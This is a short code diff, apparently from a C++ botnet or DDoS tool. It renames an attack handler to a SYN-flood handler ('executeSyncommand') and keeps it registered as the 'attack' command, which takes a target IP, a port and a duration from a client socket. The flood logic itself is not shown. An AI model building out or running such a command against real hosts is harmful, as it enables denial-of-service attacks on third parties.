@@ -3,19 +3,15 @@
 //
 
 
-#include <winsock.h>
-#include "Attack_command.h"
+#include "syn_command.h"
 #include "sys/socket.h"
-#include "cman.h"
+#include "../cman.h"
 
-void executeAttackcommand(int clientSocket, const char* args) {
+void executeSyncommand(int clientSocket, const char* args) {
 
     char* ip = strtok(args, " ");
     char* port = strtok(nullptr, " ");
     char* time = strtok(nullptr, " ");
-
-
-
 
     if (args == nullptr) {
         send(clientSocket, "Usage: attack <ip> <port> <time>\r\n", 35, 0);
@@ -27,5 +23,5 @@ void executeAttackcommand(int clientSocket, const char* args) {
 }
 __attribute__((constructor))
 void registerattackcommand() {
-    registerCommand("attack", executeAttackcommand);
+    registerCommand("attack", executeSyncommand);
 }
